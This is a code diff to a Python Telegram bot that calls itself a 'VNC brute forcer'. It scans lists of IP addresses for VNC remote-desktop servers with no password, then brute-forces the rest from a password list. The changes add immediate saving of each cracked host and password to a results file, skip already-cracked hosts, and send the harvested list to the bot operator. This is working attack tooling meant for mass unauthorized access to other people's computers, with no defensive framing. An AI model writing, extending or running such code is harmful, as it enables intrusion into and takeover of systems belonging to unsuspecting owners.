@@ -39,6 +39,7 @@ class VNCScanner:
         self.brute_queue = Queue()
         self.results = []
         self.lock = threading.Lock()
+        self.file_lock = threading.Lock()
         self.total_servers = 0
         self.checked_servers = 0
         self.passwords = []
@@ -51,6 +52,8 @@ class VNCScanner:
         self.active_threads = 0
         self.phase = "NULL_SCAN"
         self.null_servers = []
+        self.cracked_ips = set()
+        self.results_file = f'results_{chat_id}_null.txt'
         
     def load_ips(self, content):
         ips = []
@@ -72,6 +75,14 @@ class VNCScanner:
             if line and not line.startswith('#'):
                 passwords.append(line)
         return passwords
+    
+    def save_hit_to_file(self, result):
+        with self.file_lock:
+            try:
+                with open(self.results_file, 'a') as f:
+                    f.write(result + '\n')
+            except Exception as e:
+                print(f"Error saving to file: {e}")
         
     def vnc_handshake(self, sock):
         try:
@@ -185,6 +196,11 @@ class VNCScanner:
                 result = f"{ip}:{port}-null-[{server_name}]"
                 with self.lock:
                     self.results.append(result)
+                    self.cracked_ips.add(f"{ip}:{port}")
+                
+                # Save to file immediately
+                self.save_hit_to_file(result)
+                
                 if self.loop:
                     asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
             else:
@@ -210,12 +226,21 @@ class VNCScanner:
                 self.active_threads += 1
             
             ip, port = item
+            ip_port_key = f"{ip}:{port}"
             
             if not self.running:
                 with self.lock:
                     self.active_threads -= 1
                 self.brute_queue.task_done()
                 break
+            
+            # Skip if already cracked in phase 1
+            with self.lock:
+                if ip_port_key in self.cracked_ips:
+                    self.checked_servers += 1
+                    self.active_threads -= 1
+                    self.brute_queue.task_done()
+                    continue
             
             for pwd in self.passwords:
                 if not self.running:
@@ -227,6 +252,10 @@ class VNCScanner:
                     result = f"{ip}:{port}-{pwd}-[{server_name}]"
                     with self.lock:
                         self.results.append(result)
+                    
+                    # Save to file immediately
+                    self.save_hit_to_file(result)
+                    
                     if self.loop:
                         asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                     break
@@ -323,6 +352,10 @@ class VNCScanner:
         self.total_servers = len(ips)
         self.start_time = time.time()
         
+        # Clear results file
+        if os.path.exists(self.results_file):
+            os.remove(self.results_file)
+        
         print(f"Starting two-phase scan with {len(ips)} servers and {len(self.passwords)} passwords")
         
         text = (
@@ -331,8 +364,8 @@ class VNCScanner:
             f"<b>Passwords:</b> {len(self.passwords)}\n"
             f"<b>Threads:</b> {self.scan_threads}\n"
             f"<b>Timeout:</b> {self.scan_timeout}s\n\n"
-            f"Phase 1: Null password scan\n"
-            f"Phase 2: Password brute force"
+            f"Phase 1: Null password scan (auto-save)\n"
+            f"Phase 2: Password brute force (skip saved)"
         )
         keyboard = [[InlineKeyboardButton("STOP SCAN", callback_data=f"stop_{self.chat_id}")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -372,13 +405,15 @@ class VNCScanner:
         for t in threads:
             t.join(timeout=1)
         
-        # PHASE 2: BRUTE FORCE
+        print(f"Phase 1 complete: {len(self.cracked_ips)} null hits, {len(self.null_servers)} need brute force")
+        
+        # PHASE 2: BRUTE FORCE (skip already cracked)
         if self.running and len(self.null_servers) > 0:
             self.phase = "BRUTE_FORCE"
             self.checked_servers = 0
             self.total_servers = len(self.null_servers)
             
-            print(f"Phase 2: Brute forcing {len(self.null_servers)} servers")
+            print(f"Phase 2: Brute forcing {len(self.null_servers)} servers (skipping {len(self.cracked_ips)} already cracked)")
             
             threads = []
             for _ in range(self.scan_threads):
@@ -427,7 +462,7 @@ class VNCScanner:
                 f"<b>SCAN COMPLETED</b>\n\n"
                 f"<b>Hits Found:</b> {len(self.results)}\n"
                 f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
-                f"Results saved to file"
+                f"Results auto-saved during scan"
             )
         
         try:
@@ -440,12 +475,10 @@ class VNCScanner:
         except:
             pass
             
-        if len(self.results) > 0:
-            with open(f'results_{self.chat_id}.txt', 'w') as f:
-                for result in self.results:
-                    f.write(result + '\n')
+        # Send final results file
+        if len(self.results) > 0 and os.path.exists(self.results_file):
             try:
-                with open(f'results_{self.chat_id}.txt', 'rb') as f:
+                with open(self.results_file, 'rb') as f:
                     await self.bot.send_document(
                         chat_id=self.chat_id,
                         document=f,
@@ -475,7 +508,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     reply_markup = InlineKeyboardMarkup(keyboard)
     text = (
-        "<b>VNC BRUTE FORCER BOT (TWO-PHASE)</b>\n\n"
+        "<b>VNC BRUTE FORCER BOT (AUTO-SAVE)</b>\n\n"
         "Select an option to continue"
     )
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
@@ -520,7 +553,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "<b>SETTINGS</b>\n\nClick to change values\n\nNote: Bot uses two-phase scanning (null first, then brute)",
+            "<b>SETTINGS</b>\n\nClick to change values\n\nNote: Auto-saves hits, skips cracked IPs in phase 2",
             reply_markup=reply_markup,
             parse_mode=ParseMode.HTML
         )
@@ -571,7 +604,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "<b>VNC BRUTE FORCER BOT (TWO-PHASE)</b>\n\nSelect an option",
+            "<b>VNC BRUTE FORCER BOT (AUTO-SAVE)</b>\n\nSelect an option",
             reply_markup=reply_markup,
             parse_mode=ParseMode.HTML
         )
@@ -688,7 +721,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(MessageHandler(filters.ALL, handle_message))
     
-    print("Bot started - Two-Phase VNC Scanner")
+    print("Bot started - Two-Phase Auto-Save VNC Scanner")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
